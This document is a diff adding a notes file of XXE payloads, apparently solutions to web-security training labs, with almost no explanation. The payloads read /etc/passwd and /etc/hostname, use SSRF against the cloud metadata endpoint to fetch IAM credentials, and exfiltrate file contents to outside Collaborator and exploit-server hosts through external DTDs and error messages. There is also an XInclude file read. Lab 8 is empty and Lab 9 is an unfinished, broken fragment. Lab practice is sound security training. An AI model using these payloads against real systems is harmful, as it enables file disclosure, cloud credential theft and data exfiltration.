@@ -1,0 +1,85 @@
+Lab 1 : Exploiting XXE using external entities to retrieve files
+
+Payload :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+<productId>&file;</productId>
+<storeId>2</storeId>
+</stockCheck>
+
+--------------------------------------------------------------------------------
+
+Lab 2 : Exploiting XXE to perform SSRF attacks
+
+Payload :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>
+&file;
+</productId><storeId>
+2
+</storeId></stockCheck>
+
+
+Lab 3 : Blind XXE with out-of-band interaction
+
+Payload :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY file SYSTEM "http://94bav2v31bezjw2bru079dvci3otci.burpcollaborator.net"> ]>
+<stockCheck><productId>&file;</productId><storeId>3</storeId></stockCheck>
+
+
+Lab 4 : Blind XXE with out-of-band interaction via XML parameter entities
+
+Payload :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://ybd3o9du0rl5b4nm9smse7omedk38s.burpcollaborator.net/x"> %ext;
+]>
+<stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
+
+
+Lab 5 :
+
+payload : in the external server as DTD file
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+
+paylaod : in the XML parser
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a12003704b6c59bc1fa528d01be007e.exploit-server.net/exploit"> %xxe;]>
+<stockCheck><productId>
+5
+</productId><storeId>
+2
+</storeId></stockCheck>
+
+LaB 6 : Exploiting blind XXE to retrieve data via error messages
+
+Payload : As a DTD file in the external server -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+Payload : In the XML entry -->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3b00ea04637d03c2a5b6a101c900e9.exploit-server.net/exploit"> %xxe;]>
+
+Lab 7 : Exploiting XInclude to retrieve files
+
+Payload :
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+Lab 8 :
+
+
+
+Lab 9 :
+<!DOCTYPE data [<!ENTITY % ISOamso PUBLIC
+"ISO 8879:1986//ENTITIES Added Math Symbols: Ordinary//EN//XML"
+"isoamso.ent"> ]>
+<!ENTITY % ISOamso PUBLIC %ISOamso;
